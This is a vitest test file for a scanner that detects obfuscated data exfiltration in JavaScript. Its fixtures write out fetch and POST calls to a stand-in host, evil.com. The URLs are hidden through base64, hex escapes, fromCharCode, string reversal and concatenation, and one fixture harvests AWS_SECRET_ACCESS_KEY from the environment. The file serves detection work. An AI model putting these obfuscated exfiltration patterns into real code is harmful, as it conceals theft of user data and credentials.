import { describe, it, expect } from 'vitest';
import { detectObfuscatedExfiltration } from '../src/obfuscated-exfil.js';

describe('detectObfuscatedExfiltration', () => {
  it('detects base64-encoded exfiltration URL', () => {
    const code = `const url = atob('aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA=='); fetch(url, { method: 'POST', body: JSON.stringify(data) });`;
    const result = detectObfuscatedExfiltration(code);
    expect(result.hasObfuscatedExfil).toBe(true);
    expect(result.totalPatterns).toBeGreaterThanOrEqual(1);
    expect(result.decodedSamples.length).toBeGreaterThanOrEqual(1);
    expect(result.decodedSamples[0].decoded).toContain('evil');
  });

  it('detects hex-constructed API endpoint', () => {
    const code = `const host = "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x63\\x6f\\x6d"; fetch(host);`;
    const result = detectObfuscatedExfiltration(code);
    expect(result.hasObfuscatedExfil).toBe(true);
    expect(result.findings.some(f => f.type === 'hex_endpoint')).toBe(true);
  });

  it('detects String.fromCharCode URL construction', () => {
    const code = `const url = String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109); fetch(url);`;
    const result = detectObfuscatedExfiltration(code);
    expect(result.hasObfuscatedExfil).toBe(true);
    expect(result.findings.some(f => f.type === 'charcode_url')).toBe(true);
    expect(result.decodedSamples.some(s => s.method === 'charcode')).toBe(true);
  });

  it('detects string reversal obfuscation', () => {
    const code = `const url = 'moc.laer.tpihsresworbtea'.split('').reverse().join(''); window.location = url;`;
    const result = detectObfuscatedExfiltration(code);
    expect(result.hasObfuscatedExfil).toBe(true);
    expect(result.findings.some(f => f.type === 'string_reversal')).toBe(true);
  });

  it('detects environment variable harvesting with base64', () => {
    const code = `const token = process.env['AWS_SECRET_ACCESS_KEY']; const encoded = atob(token);`;
    const result = detectObfuscatedExfiltration(code);
    expect(result.hasObfuscatedExfil).toBe(true);
    expect(result.findings.some(f => f.type === 'env_harvest')).toBe(true);
  });

  it('detects concatenated URL construction', () => {
    const code = `const url = 'https:' + '//evil.com/steal'; fetch(url);`;
    const result = detectObfuscatedExfiltration(code);
    expect(result.hasObfuscatedExfil).toBe(true);
    expect(result.findings.some(f => f.type === 'concat_url')).toBe(true);
  });

  it('detects template literal URL assembly', () => {
    const code = 'const url = `https://' + '${subdomain}.evil.com/${path}`; fetch(url, payload);';
    const result = detectObfuscatedExfiltration(code);
    expect(result.hasObfuscatedExfil).toBe(true);
  });

  it('detects decode-then-send pattern', () => {
    const code = `const data = atob(encryptedPayload); axios.post('https://api.example.com/collect', data);`;
    const result = detectObfuscatedExfiltration(code);
    expect(result.hasObfuscatedExfil).toBe(true);
    expect(result.findings.some(f => f.type === 'decode_then_send' || f.type === 'base64_url')).toBe(true);
  });

  it('does not flag legitimate code without obfuscation patterns', () => {
    const code = `const x = 42; console.log(x); function add(a, b) { return a + b; }`;
    const result = detectObfuscatedExfiltration(code);
    expect(result.severity).toBe('clean');
  });

  it('decodes base64 strings and includes them in decodedSamples', () => {
    const code = `const url = atob('aHR0cHM6Ly9zdGVhbGVyLmNvbS9hcGk=');`;
    const result = detectObfuscatedExfiltration(code);
    expect(result.decodedSamples.length).toBeGreaterThanOrEqual(1);
    expect(result.decodedSamples[0].decoded).toContain('steal');
  });

  it('assigns higher confidence for multiple pattern matches', () => {
    const code = `
      const url = atob('aHR0cHM6Ly9ldmlsLmNvbQ==');
      const host = process.env.INTERNAL_HOST;
      const encoded = btoa(host);
      const reversed = 'moc.laer'['split']('')['reverse']()['join']('');
    `;
    const result = detectObfuscatedExfiltration(code);
    expect(result.confidence).toBeGreaterThanOrEqual(0.7);
  });
});